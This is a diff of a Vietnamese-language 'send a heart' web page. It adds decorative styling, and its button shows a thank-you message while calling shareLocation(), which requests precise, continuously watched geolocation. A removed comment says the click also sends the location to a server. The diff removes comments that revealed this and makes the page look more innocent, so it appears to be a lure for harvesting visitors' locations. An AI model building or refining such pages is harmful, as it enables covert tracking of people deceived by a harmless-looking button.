@@ -3,25 +3,64 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Hello Guy</title>
+  <title>Thả Tim</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #fff0f5;
+      text-align: center;
+      padding-top: 100px;
+    }
+
+    h1 {
+      color: #ff4081;
+      font-size: 3em;
+      margin-bottom: 20px;
+    }
+
+    #btn-share {
+      background-color: #ff4081;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 6px 18px rgba(255, 64, 129, 0.3);
+      transition: all 0.3s ease;
+    }
+
+    #btn-share:hover {
+      background-color: #f50057;
+      transform: scale(1.05);
+    }
+
+    #thank {
+      display: none;
+      color: #d81b60;
+      font-size: 1.4em;
+      font-weight: bold;
+      margin-top: 30px;
+      animation: fadeIn 0.6s ease-in-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+  </style>
 </head>
 <body>
-  <h1>Thả tim</h1>
+  <h1>💖 Thả tim</h1>
   <button id="btn-share">Nhấp để thả tim</button>
-  <!-- 1. Thêm dòng cảm ơn ẩn sẵn -->
-  <p id="thank" style="display:none; color:deeppink; font-size:1.2em; font-weight:bold; margin-top:10px;">
-    ❤️ Cảm ơn bạn đã thả tim!
-  </p>
+  <p id="thank">❤️ Cảm ơn bạn đã thả tim!</p>
 
   <script>
     const btn = document.getElementById('btn-share');
     const thank = document.getElementById('thank');
 
     btn.addEventListener('click', () => {
-      // 2. Khi nhấn nút, hiện dòng cảm ơn
       thank.style.display = 'block';
-
-      // (và gọi tiếp logic lấy vị trí + gửi lên server như bình thường)
       shareLocation();
     });
 
@@ -35,7 +74,7 @@
         timeout: 20000,
         maximumAge: 0
       };
-      const minAccuracy = 30; // mét
+      const minAccuracy = 30;
 
       let watchId = navigator.geolocation.watchPosition(
         pos => {
